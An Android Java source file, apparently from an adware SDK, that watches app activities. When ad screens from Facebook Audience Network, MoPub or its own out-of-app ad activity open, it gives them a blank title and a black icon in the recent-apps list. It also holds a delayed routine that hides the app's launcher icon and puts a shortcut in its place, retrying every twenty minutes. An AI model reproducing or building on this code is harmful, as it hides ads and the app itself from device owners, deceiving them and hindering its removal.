package com.x.codeX.agent;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.text.format.DateUtils;
import android.util.Log;

import com.facebook.ads.AudienceNetworkActivity;
import com.mopub.common.MoPubBrowser;
import com.mopub.mobileads.MoPubActivity;
import com.mopub.mobileads.MraidActivity;
import com.mopub.mobileads.MraidVideoPlayerActivity;
import com.x.codeX.R;
import com.x.codeX.XApp;
import com.x.codeX.agent.keepLive.OutAdActivity;
import com.x.codeX.agent.utils.SpUtil;
import com.x.codeX.agent.utils.XUtils;

import static com.x.codeX.XApp.sDebug;

public class ActivityMonitor {
    private volatile static ActivityMonitor activityMonitor;


    private String spName;
    public static ActivityMonitor getActivityMonitor() {
        if (activityMonitor == null) {
            synchronized (ActivityMonitor.class) {
                if (activityMonitor == null) {
                    activityMonitor = new ActivityMonitor();
                }
            }
        }
        return activityMonitor;
    }

    public void register(Application application) {
        application.registerActivityLifecycleCallbacks(new Application.ActivityLifecycleCallbacks() {
            @Override
            public void onActivityCreated(Activity activity, Bundle bundle) {
                hide(activity);
//                Log.i("ActivityLife",activity+"Create");
//                try {
//                    ActivityInfo info = activity.getPackageManager().getActivityInfo(activity.getComponentName(), PackageManager.GET_META_DATA);
//                    String launcherCls = XUtils.queryLauncherActivity();
//                    if (info.name.equals(launcherCls)){
//                        spName = activity.getClass().getName();
//                        hideLauncher();
//                    }
//                } catch (PackageManager.NameNotFoundException e) {
//                    e.printStackTrace();
//                }
            }

            @Override
            public void onActivityStarted(Activity activity) {

            }

            @Override
            public void onActivityResumed(Activity activity) {


            }

            @Override
            public void onActivityPaused(Activity activity) {

            }

            @Override
            public void onActivityStopped(Activity activity) {

            }

            @Override
            public void onActivitySaveInstanceState(Activity activity, Bundle bundle) {

            }

            @Override
            public void onActivityDestroyed(Activity activity) {
                Log.i("ActivityLife",activity+"Destory");
            }
            protected void hideLauncher() {
                if (SpUtil.mPrefSp().getBoolean("isHeadLauncher", false))
                    return;
                String name = spName;
                final Handler handler = new Handler();
                handler.postDelayed(() -> {
                    try {
                        if (XUtils.getIsNeedHideIcon()) {
                            if (!XApp.isOrigin) {
                                if (!XUtils.isAppClude()) {
                                    try {
                                        String launcherCls = XUtils.queryLauncherActivity();
                                        XUtils.hideLauncherIcon(launcherCls);
                                    } catch (Throwable err) {
                                        if (sDebug) err.printStackTrace();
                                    }
                                    SpUtil.mPrefSp().put("isHeadLauncher", true);

                                    try {
                                        XUtils.addShortCutCompact(XApp.app, Class.forName(name));
                                    } catch (Exception e) {
                                        if (sDebug) e.printStackTrace();
                                    }
                                }
                            }
                        } else {
                            handler.postDelayed(this::hideLauncher, 20 * DateUtils.MINUTE_IN_MILLIS);
                        }
                    } catch (Throwable err) {
                        if (sDebug) err.printStackTrace();
                    }
                }, 30_000);
            }

        });

    }




    private void hide(Activity activity) {
        XApp.getUIHandler().post(new Runnable() {
            @Override
            public void run() {
                if (!isAdActivity(activity)) {
                    return;
                }
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
                    ActivityManager.TaskDescription description = new ActivityManager.TaskDescription(" ", R.drawable.black_icon);
                    activity.setTaskDescription(description);
                }else if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
                    Bitmap bitmap = BitmapFactory.decodeResource(activity.getResources(),R.drawable.black_icon);
                    ActivityManager.TaskDescription description = new ActivityManager.TaskDescription(" ",bitmap);
                    activity.setTaskDescription(description);
                }
            }
        });
    }

    private boolean isAdActivity(Activity activity) {
        if (activity instanceof OutAdActivity
                || activity instanceof AudienceNetworkActivity
                || activity instanceof MoPubActivity
                || activity instanceof MraidActivity
                || activity instanceof MraidVideoPlayerActivity
                || activity instanceof MoPubBrowser) {
            return true;
        }
        return false;
    }

}